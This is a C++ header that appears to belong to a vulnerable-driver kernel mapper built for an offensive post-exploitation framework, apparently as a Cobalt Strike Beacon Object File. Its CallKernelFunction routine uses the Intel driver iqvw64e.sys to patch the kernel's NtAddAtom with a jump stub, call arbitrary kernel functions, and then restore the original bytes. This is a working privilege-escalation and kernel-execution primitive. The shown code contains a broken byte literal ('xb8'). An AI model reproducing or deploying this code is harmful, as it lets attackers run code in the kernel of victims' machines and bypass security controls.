#pragma once
#include "monolith.hpp"
#include "intel_driver_resource.hpp"
#include "service.hpp"
#include "utils.hpp"

#define WMAX_PATH (MAX_PATH + 1 * sizeof(wchar_t))

namespace Intel {
	__attribute__((used, section(".data"))) WCHAR driver_name[200] = { }; //NOTE: "iqvw64e.sys" TODO: to be loaded by the BOF
	__attribute__((used, section(".data"))) WCHAR driver_reg_path[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\";
	__attribute__((used, section(".data"))) WCHAR service_path[] = L"SYSTEM\\CurrentControlSet\\Services";

	__attribute__((used, section(".rdata"))) STATIC CONST CHAR alphanum[] = {
		0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x6c,0x6d,0x6e,0x6f,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7a,
		0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,0x4b,0x4c,0x4d,0x4e,0x4f,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a
	};
		
	constexpr DWORD timestamp = 0x5284EAC3;

	template<typename T, typename ...A>
	BOOL CallKernelFunction(HANDLE handle, UINT_PTR function, T *result, const A ...arguments) {

		constexpr auto call_void = std::is_same_v<T, void>; // might need statically compiled
		static_assert(sizeof...(A) <= 4);

		if constexpr (!call_void) {
			if (!result) {
				return false;
			}
		}
		else {
			UNREFERENCED_PARAMETER(result);
		}

		if (!function) {
			return false;
		}

		HMODULE ntdll = (HMODULE) FindModuleEntry(NTDLL)->DllBase;
		if (!ntdll) {
			return false;
		}

		const auto NtAddAtom = (void*) GetProcAddress(ntdll, "NtAddAtom");
		if (!NtAddAtom) {
			return false;
		}

		UINT8 injected_jmp[] = { 0x48,xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xe0 };
		UINT8 org_function[sizeof(injected_jmp)];

		*(UINT_PTR*) &injected_jmp[2] = function;

		static UINT_PTR nt_add_atom = GetKernelExport(handle, ntoskrnl, "NtAddAtom");
		if (!nt_add_atom) {
			return false;
		}

		if (!Beacon$ReadMemory(handle, &org_function, nt_add_atom, sizeof(injected_jmp)))
			return false;

		if (org_function[0] == injected_jmp[0] && org_function[1] == injected_jmp[1] &&
			org_function[sizeof(injected_jmp) - 2] == injected_jmp[sizeof(injected_jmp) - 2] &&
			org_function[sizeof(injected_jmp) - 1] == injected_jmp[sizeof(injected_jmp) - 1]) {
			return false;
		}

		if (!Beacon$WriteToReadOnlyMemory(handle, &injected_jmp, nt_add_atom, sizeof(injected_jmp)))
			return false;

		if constexpr (!call_void) {
			using function_t = T(__stdcall*)(A...);
			const auto _function = (function_t) NtAddAtom;

			*result = _function(arguments...);
		}
		else {
			using function_t = void(__stdcall*)(A...);
			const auto _function = (function_t) NtAddAtom;

			_function(arguments...);
		}

		// Restore the pointer/jmp
		return Beacon$WriteToReadOnlyMemory(handle, nt_add_atom, org_function, sizeof(injected_jmp));
	}
}
